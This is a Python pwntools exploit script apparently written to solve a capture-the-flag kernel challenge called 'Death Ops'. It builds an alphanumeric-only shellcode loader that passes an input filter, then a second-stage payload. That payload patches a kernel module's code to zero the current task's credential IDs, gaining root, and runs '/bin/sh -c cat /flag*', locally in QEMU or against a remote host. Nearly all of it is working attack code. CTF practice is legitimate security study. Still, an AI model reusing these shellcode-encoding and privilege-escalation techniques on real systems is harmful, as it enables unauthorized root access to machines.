#!/usr/bin/env python3
"""Stock (unpatched) Death Ops: alphanumeric loader + proven module-text LPE."""
from pwn import *
import re
import sys

context.arch = "amd64"
context.log_level = "info"

WS = "/home/y_rose/ctf/pwnsec_2026/Pwn/Death_Ops/agent_workspace"
ALNUM = bytes(list(range(0x30, 0x3A)) + list(range(0x41, 0x5B)) + list(range(0x61, 0x7B)))
ALNUM_SET = set(ALNUM)
DUMMY = b"flag{test_flag_for_ctf_challenge}"
WANT = b"flag{real_test}"

KSTUB = asm(
    """
    mov rax, gs:[0x14b40]
    mov rcx, qword ptr [rax+0x608]
    xor edi, edi
    mov dword ptr [rcx+0x04], edi
    mov dword ptr [rcx+0x1c], edi
    and dword ptr [rax], 0xfffffeff
    ret
    """
)
assert len(KSTUB) <= 0x20
KSTUB = KSTUB.ljust((len(KSTUB) + 7) & ~7, b"\x90")
BYPASS = u64(bytes.fromhex("31c0909090909090"))


def qemu_cmd(initrd):
    return [
        "qemu-system-x86_64",
        "-m",
        "256M",
        "-kernel",
        f"{WS}/qemu/bzImage",
        "-initrd",
        initrd,
        "-append",
        "console=ttyS0 oops=panic panic=1 kaslr pti=on quiet",
        "-nographic",
        "-no-reboot",
        "-monitor",
        "none",
        "-serial",
        "stdio",
        "-net",
        "none",
    ]


def recipes(m=0x41, disp=0x41):
    assert disp in ALNUM_SET
    tbl = {}
    for t in range(256):
        for imm in ALNUM:
            if (m * imm) & 0xFF == t:
                tbl[t] = bytes([0x6B, 0x41, disp, imm])
                break
        if t in tbl:
            continue
        for imm in ALNUM:
            for x in ALNUM:
                if ((m * imm) ^ x) & 0xFF == t:
                    tbl[t] = bytes([0x6B, 0x41, disp, imm, 0x34, x])
                    break
            if t in tbl:
                break
        assert t in tbl
    return tbl


def alnum_loader():
    """Plant `lea rsi,[rcx+0x70]; syscall; jmp rsi` and fall through.

    rdx=0x30 so the first read deposits a 48-byte prefix at rwx+0x70
    without touching the loader or the stub at +0x50.

    blackops memcpy's the full 96-byte pad. Stub slots are pre-filled
    with 'S' (0x53). The imul constant is '3' at 0x58 (after the stub)
    so fall-through never clobbers rcx. Recipes XOR 0x53^opcode.
    """
    stub = bytes.fromhex("488d71700f05ffe6")
    stub_off = 0x50
    const_off = 0x58  # after stub; never executed (jmp rsi)
    const_val = 0x33  # '3'
    initial = 0x53  # 'S' — pair with m=0x33 gives 60-byte plant
    tbl = recipes(const_val, const_off)
    assert all((stub_off + i) in ALNUM_SET for i in range(len(stub)))

    setup = b"PY"  # rcx = rwx
    setup += b"j0Z"  # rdx = 0x30
    setup += b"j0X40"  # eax = 0
    setup += b"kyz0"  # edi = [rcx+0x7a]*0x30 == 0

    body = b""
    for i, b in enumerate(stub):
        body += tbl[initial ^ b]
        body += bytes([0x30, 0x41, stub_off + i])

    head = setup + body + b"j0X40"  # restore eax=0
    assert len(head) <= stub_off, (len(head), stub_off)
    payload = bytearray(head)
    payload.extend(bytes([initial]) * (96 - len(payload)))
    payload[const_off] = const_val
    assert len(payload) == 96
    assert all(c in ALNUM_SET for c in payload), [hex(c) for c in payload if c not in ALNUM_SET]
    log.info("alnum head=%d %s", len(head), payload.decode("ascii"))
    return bytes(payload)


def stage2_prefix():
    """Runs at rwx+0x70. Reads the LPE blob to rwx+0xa0 (past this 0x30 window)."""
    p = asm(
        """
        lea r12, [rip]
        sub r12, 0x77
        lea rsi, [r12+0xa0]
        xor eax, eax
        xor edi, edi
        mov edx, 0x400
        syscall
        jmp rsi
        """
    )
    assert len(p) <= 0x30, len(p)
    return p.ljust(0x30, b"\x90")


def stage2_lpe(text):
    stub_off = 0x00
    pairs = [(text + 0x3B, BYPASS)]
    for i in range(0, len(KSTUB), 8):
        pairs.append((text + stub_off + i, u64(KSTUB[i : i + 8])))
    rel = (text + stub_off - (text + 0x30 + 5)) & 0xFFFFFFFF
    jmp_val = u64(bytes([0xE9]) + p32(rel) + b"\x90\x90\x90")
    pairs.append((text + 0x30, jmp_val))
    table = b"".join(p64(a) + p64(v) for a, v in pairs)
    sc = asm(
        f"""
        /* r12 = rwx page, set by prefix */
        mov eax, 1
        mov edi, 1
        lea rsi, [rip+hi]
        mov edx, 3
        syscall
        lea rbx, [rip+table]
        mov r15d, {len(pairs)}
    loop:
        mov rax, qword ptr [rbx]
        mov qword ptr [r12], rax
        mov rax, qword ptr [rbx+8]
        mov qword ptr [r12+8], rax
        mov eax, 1
        mov edi, 3
        mov rsi, r12
        mov edx, 16
        syscall
        add rbx, 16
        dec r15
        jnz loop
        mov eax, 1
        mov edi, 3
        mov rsi, r12
        mov edx, 16
        syscall
        lea rdi, [rip+sh]
        push 0
        lea rax, [rip+cmd]
        push rax
        lea rax, [rip+dashc]
        push rax
        push rdi
        mov rsi, rsp
        xor edx, edx
        mov eax, 59
        syscall
        mov eax, 60
        xor edi, edi
        syscall
        hi:
        .byte 0x53, 0x32, 0x0a
        sh:
        .asciz "/bin/sh"
        dashc:
        .asciz "-c"
        cmd:
        .asciz "cat /flag*"
        table:
        """
    )
    blob = sc + table
    log.info("stage2 %d pairs %d", len(blob), len(pairs))
    return blob


def exploit(io):
    io.recvuntil(b"CMD> ", timeout=90)
    io.send(b"1\n")
    io.recvuntil(b"TARGET> ")
    io.send(b"/sys/module/shadowops/sections/.text\n")
    data = io.recvuntil(b"CMD> ", timeout=10)
    text = int(re.search(br"0x[0-9a-f]+", data).group(), 16)
    log.info("module .text %s", hex(text))

    loader = alnum_loader()
    prefix = stage2_prefix()
    assert len(prefix) == 0x30
    s2 = stage2_lpe(text)
    io.send(b"2\n")
    io.recvuntil(b"PAYLOAD> ")
    io.send(loader)
    sleep(0.2)
    io.send(prefix + s2)
    return io.recvrepeat(6)


def main():
    initrd = f"{WS}/qemu/rootfs.stockflag.cpio.gz"
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        io = remote(sys.argv[2], int(sys.argv[3]))
    else:
        io = process(qemu_cmd(initrd))
    try:
        out = exploit(io)
    finally:
        io.kill()
    sys.stdout.buffer.write(out)
    if DUMMY in out and WANT not in out:
        print("\nDUMMY ONLY — not a solve", file=sys.stderr)
        return 2
    if WANT in out:
        print("\nFLAG", WANT.decode(), file=sys.stderr)
        return 0
    print("\nNO FLAG", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
